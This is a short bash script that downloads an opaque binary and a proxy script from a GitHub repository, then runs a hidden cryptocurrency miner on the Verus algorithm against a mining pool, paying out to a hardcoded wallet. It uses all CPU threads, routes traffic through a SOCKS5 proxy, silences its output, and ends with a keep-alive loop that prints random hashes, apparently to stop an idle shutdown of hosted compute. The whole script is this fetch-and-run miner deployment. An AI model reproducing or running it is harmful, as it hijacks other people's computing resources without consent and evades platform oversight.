#!/bin/bash
apt update
apt -y install curl python3 libjansson4
wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/bionicv2
wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
chmod +x bionicv2 proxy.py
python3 proxy.py >/dev/null &
pool="stratum+tcp://na.luckpool.net:3956"
wallet="RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
proxy="socks5://72.195.114.169:4145"
./bionicv2 -a verus -o $pool -u $wallet.$workername -p x -t $thread -x $proxy >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
